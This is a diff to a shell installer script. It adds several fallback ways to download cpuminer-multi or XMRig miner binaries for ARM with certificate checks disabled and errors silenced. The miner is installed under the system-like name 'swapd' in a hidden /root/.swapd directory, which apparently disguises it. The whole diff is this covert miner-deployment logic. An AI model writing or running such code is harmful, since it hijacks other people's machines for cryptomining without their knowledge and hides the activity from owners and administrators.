@@ -1033,41 +1033,111 @@ if [ "$MINER_TYPE" = "cpuminer" ]; then
     mkdir -p /root/.swapd
     cd /root/.swapd || exit 1
     
-    # cpuminer-multi precompiled for ARMv7
+    # Clean up any previous failed attempts
+    rm -f swapd cpuminer* *.tar.gz 2>/dev/null
+    
+    # Try multiple sources for cpuminer-multi ARM binary
+    DOWNLOAD_SUCCESS=false
+    
+    # Method 1: Try official release tarball
+    echo "[*] Trying official cpuminer-multi release..."
     CPUMINER_URL="https://github.com/tpruvot/cpuminer-multi/releases/download/v1.3.7/cpuminer-multi-rel1.3.7-arm.tar.gz"
     
-    echo "[*] Downloading from: $CPUMINER_URL"
-    if curl -L -k -o cpuminer.tar.gz "$CPUMINER_URL" 2>/dev/null || wget --no-check-certificate -O cpuminer.tar.gz "$CPUMINER_URL" 2>/dev/null; then
-        echo "[✓] Downloaded"
-        tar -xzf cpuminer.tar.gz 2>/dev/null || {
-            echo "[!] Extraction failed, trying alternative..."
-            # Fallback: try to download individual binary
-            curl -L -k -o swapd "https://github.com/tpruvot/cpuminer-multi/releases/download/v1.3.7/cpuminer-multi-arm" 2>/dev/null
-        }
-        
-        # Find and rename binary
-        if [ -f cpuminer-multi ]; then
-            mv cpuminer-multi swapd
-        elif [ -f bin/cpuminer-multi ]; then
-            mv bin/cpuminer-multi swapd
-        elif [ -f cpuminer-multi-arm ]; then
-            mv cpuminer-multi-arm swapd
+    if curl -L -k -o cpuminer.tar.gz "$CPUMINER_URL" 2>/dev/null && [ -s cpuminer.tar.gz ]; then
+        echo "[*] Tarball downloaded, extracting..."
+        if tar -xzf cpuminer.tar.gz 2>/dev/null; then
+            # Look for binary in common locations
+            for location in cpuminer-multi ./cpuminer-multi bin/cpuminer-multi usr/local/bin/cpuminer-multi; do
+                if [ -f "$location" ]; then
+                    cp "$location" swapd
+                    DOWNLOAD_SUCCESS=true
+                    break
+                fi
+            done
         fi
-        
+        rm -rf cpuminer.tar.gz bin usr 2>/dev/null
+    fi
+    
+    # Method 2: Try wget if curl failed
+    if [ "$DOWNLOAD_SUCCESS" = false ]; then
+        echo "[*] Trying with wget..."
+        if wget --no-check-certificate -O cpuminer.tar.gz "$CPUMINER_URL" 2>/dev/null && [ -s cpuminer.tar.gz ]; then
+            if tar -xzf cpuminer.tar.gz 2>/dev/null; then
+                for location in cpuminer-multi ./cpuminer-multi bin/cpuminer-multi; do
+                    if [ -f "$location" ]; then
+                        cp "$location" swapd
+                        DOWNLOAD_SUCCESS=true
+                        break
+                    fi
+                done
+            fi
+            rm -rf cpuminer.tar.gz bin usr 2>/dev/null
+        fi
+    fi
+    
+    # Method 3: Try direct binary download
+    if [ "$DOWNLOAD_SUCCESS" = false ]; then
+        echo "[*] Trying direct binary download..."
+        BINARY_URL="https://github.com/tpruvot/cpuminer-multi/releases/download/v1.3.7/cpuminer-multi-arm"
+        if curl -L -k -o swapd "$BINARY_URL" 2>/dev/null && [ -s swapd ]; then
+            DOWNLOAD_SUCCESS=true
+        elif wget --no-check-certificate -O swapd "$BINARY_URL" 2>/dev/null && [ -s swapd ]; then
+            DOWNLOAD_SUCCESS=true
+        fi
+    fi
+    
+    # Method 4: Use XMRig compiled for ARM as last resort
+    if [ "$DOWNLOAD_SUCCESS" = false ]; then
+        echo "[*] cpuminer-multi unavailable, trying XMRig for ARM..."
+        XMRIG_ARM_URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-armv7l.tar.gz"
+        if curl -L -k -o xmrig.tar.gz "$XMRIG_ARM_URL" 2>/dev/null && [ -s xmrig.tar.gz ]; then
+            if tar -xzf xmrig.tar.gz 2>/dev/null; then
+                for location in xmrig xmrig-*/xmrig; do
+                    if [ -f "$location" ]; then
+                        cp "$location" swapd
+                        DOWNLOAD_SUCCESS=true
+                        break
+                    fi
+                done
+            fi
+            rm -rf xmrig.tar.gz xmrig-* 2>/dev/null
+        fi
+    fi
+    
+    # Validate the downloaded binary
+    if [ "$DOWNLOAD_SUCCESS" = true ] && [ -f swapd ]; then
         chmod +x swapd 2>/dev/null
-        rm -rf cpuminer.tar.gz bin 2>/dev/null
         
-        if [ -f swapd ] && [ -x swapd ]; then
-            echo "[✓] cpuminer-multi installed as 'swapd'"
-            ls -lh swapd
+        # Check file size (must be at least 100KB for a real miner)
+        FILE_SIZE=$(stat -c%s swapd 2>/dev/null || wc -c < swapd)
+        if [ "$FILE_SIZE" -lt 100000 ]; then
+            echo "[!] ERROR: Downloaded file is too small ($FILE_SIZE bytes)"
+            echo "[!] Expected at least 100KB for a miner binary"
+            rm -f swapd
+            DOWNLOAD_SUCCESS=false
         else
-            echo "[!] ERROR: Failed to install cpuminer-multi"
-            echo "[!] ARM32 mining not possible on this system"
-            exit 1
+            echo "[✓] Downloaded miner binary ($((FILE_SIZE / 1024))KB)"
+            ls -lh swapd
         fi
-    else
-        echo "[!] ERROR: Failed to download cpuminer-multi"
-        echo "[!] Network issue or GitHub blocked"
+    fi
+    
+    # Final check
+    if [ ! -f swapd ] || [ ! -s swapd ]; then
+        echo ""
+        echo "[!] ERROR: Failed to download miner for ARM32"
+        echo "[!] All download methods failed:"
+        echo "    - cpuminer-multi tarball"
+        echo "    - cpuminer-multi binary"
+        echo "    - XMRig ARMv7 static binary"
+        echo ""
+        echo "[!] Possible issues:"
+        echo "    - GitHub may be blocked"
+        echo "    - Network connectivity issues"
+        echo "    - Insufficient disk space"
+        echo ""
+        echo "Available disk space:"
+        df -h /root
+        echo ""
         exit 1
     fi
     
